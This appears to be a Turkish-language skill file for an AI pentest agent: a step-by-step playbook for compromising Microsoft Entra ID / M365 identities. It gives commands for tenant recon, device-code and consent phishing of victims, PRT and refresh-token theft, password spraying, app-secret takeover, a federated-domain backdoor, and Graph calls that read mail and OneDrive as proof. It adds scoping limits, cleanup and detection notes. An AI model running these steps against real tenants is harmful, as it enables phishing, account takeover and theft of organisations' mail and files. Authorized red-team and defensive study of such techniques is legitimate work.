---
name: entra-id-attack
description: Entra ID / Microsoft 365 kimlik saldırıları: tenant recon, token/PRT hırsızlığı, device-code ve consent phishing, AzureHound graf analizi, Graph ile privilege path çıkarma ve impact kanıtı.
---
# Entra ID / M365 Kimlik Saldırıları

## Amaç ve kapsam
Hedef tenant'ta kimlik katmanını ele geçirme zincirini uçtan uca yürütmek: dışarıdan recon → kimlik bilgisi/token ele geçirme → Graph üzerinden yetki yolu → **ölçülmüş impact** → temizlik. On-prem AD için `ad-enumeration`, sertifika için `adcs-abuse`, bulut kontrol düzlemi için `cloud-attack-path` ile birlikte kullan.

## Girdi / hazırlık
- Tenant domain(ler)i ve varsa test kullanıcıları (kullanıcı/şifre, MFA durumu).
- SMS/OTP gerekiyorsa operatörden kod al (`ask_operator`).
- Araçlar: `roadrecon` (pipx install roadrecon), `AADInternals` (PowerShell), `GraphRunner`, `AzureHound`, Microsoft Graph PowerShell (`Connect-MgGraph`), `TokenTactics`, `o365creeper`.

## 1) Dışarıdan recon (kimlik doğrulamasız)
```bash
# tenant bilgisi, doğrulanmış domainler, federation tipi
roadrecon auth --device-code
roadrecon gather && roadrecon gui

pwsh -c 'Import-Module AADInternals
  Invoke-AADIntReconAsOutsider -DomainName <domain> | Format-List
  Get-AADIntLoginInformation -DomainName <domain>
  Get-AADIntTenantDomains -Domain <domain>'
```
Topla: tenant id, doğrulanmış domainler, `AuthType` (Managed/Federated), MFA/CA varlığı, kullanıcı adı formatı, olası legacy auth.

## 2) Kimlik/token ele geçirme
- **Device-code phishing**: `TokenTactics` → `Invoke-DeviceCodeFlow` / `Get-AzureToken`; kurban kodu girer, oturum token'ları gelir. Ardından `Invoke-RefreshToMSGraphToken`, `Invoke-RefreshToAzureManagementToken`.
- **Illicit consent**: Graph uygulamasına `Mail.Read`, `Files.ReadWrite.All`, `offline_access` izinleri; `adminconsent` linki. Consent kaydı audit log'a düşer — PoC'de bunu not et.
- **PRT**: cihazda `AADInternals\Get-AADIntUserPRTToken`; PRT + `roadrecon`/`AADInternals` ile oturum açma.
- **Token yeniden kullanımı**: ele geçen refresh token ile `roadrecon auth --tokens ...` veya Graph çağrıları; CA/MFA atlatıldı mı doğrula.
- **Parola sprey**: yalnız düşük hız + lockout politikası biliniyorsa; `MSOLSpray`/`o365creeper` (kullanıcı enumerasyonu). Kilitlenme riski varsa dur.

## 3) Graph ile yüzey ve yetki yolları
```powershell
Connect-MgGraph -Scopes "Directory.Read.All","RoleManagement.Read.Directory","Application.Read.All"
Get-MgOrganization
Get-MgUser -All -Property id,userPrincipalName,displayName,accountEnabled
Get-MgDirectoryRole -All
Get-MgRoleManagementDirectoryRoleAssignmentSchedule -All
Get-MgServicePrincipal -All | Where-Object {$_.AppRoles}
Get-MgOauth2PermissionGrant -All
Get-MgApplication -All | Select-Object DisplayName,AppId,RequiredResourceAccess
```
Yüksek değerli yollar:
- **Global Admin / Privileged Role Admin / Application Admin / Cloud App Admin** atamaları.
- **App takeover**: sahip olunan/kontrol edilen app'e secret veya sertifika ekleyip `Directory.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`, `Mail.Read`, `Files.ReadWrite.All` izinleriyle token almak.
- **Federated domain backdoor**: `Set-AADIntDomainFederationSettings` (yalnız yetkili kapsamda, lab/PoC; geri alınması zorunlu).
- **Managed Identity** (Azure VM/Function): `IDENTITY_ENDPOINT`/`MSI_ENDPOINT` → ARM token → abonelik rolleri.
- **AzureHound** ile tüm tenant grafı:
```bash
azurehound -u <user> -p '<pass>' list -o azurehound.json
# BloodHound CE'ye import → shortest path to Global Admin / Key Vault / Storage
```

## 4) Impact kanıtı (PoE 3-4, salt-okunur)
Kanıtı **tek** bir nesneyle sınırla, veriyi raporla ama maskele:
```bash
# kendi/test kullanıcısının posta kutusundan tek mesaj metadata
curl -H "Authorization: Bearer $GRAPH" \
  'https://graph.microsoft.com/v1.0/me/messages?$top=1&$select=subject,receivedDateTime,from'
# OneDrive dosya listesi (ilk 3)
curl -H "Authorization: Bearer $GRAPH" 'https://graph.microsoft.com/v1.0/me/drive/root/children?$top=3'
# rol atamaları: ele geçirilen hesapla okunabiliyor mu
curl -H "Authorization: Bearer $GRAPH" 'https://graph.microsoft.com/v1.0/directoryRoles'
```
Kanıt seviyesi: token ile gerçek veri okunduysa L3; DA/Global Admin eşdeğeri yetki kanıtlandıysa L4. **Toplu mailbox/OneDrive indirme yok.**

## 5) Temizlik
- `Revoke-MgUserSignInSession -UserId <id>` (çalınan/oluşturulan oturumlar).
- Eklenen app secret/certificate ve consent grant'ları sil; oluşturulan service principal/app'i kaldır.
- Federation ayarını orijinaline döndür (`Set-AADIntDomainFederationSettings` tersi) ve doğrula.
- Sprey denemelerinde kilitlenen hesap varsa raporla; oluşturulan tüm artefaktları listele.

## Tespit / blue-team hook'ları
Sign-in logs: `DeviceCodeFlow`, non-interactive sign-in, yeni app consent, `Add servicePrincipalCredentials`, `Set federation settings`, `Update application – Certificates and secrets`. Bu olayları rapora "tespit edildi/edilmedi" olarak yaz.

## Tuzaklar
Conditional Access blokları, token protection (binding), tenant restrictions, `Security Defaults`, Graph throttling (429), MFA number matching. FIDO2 varsa AiTM çalışmaz — `aitm-phishing` sonucunu buna göre yorumla.
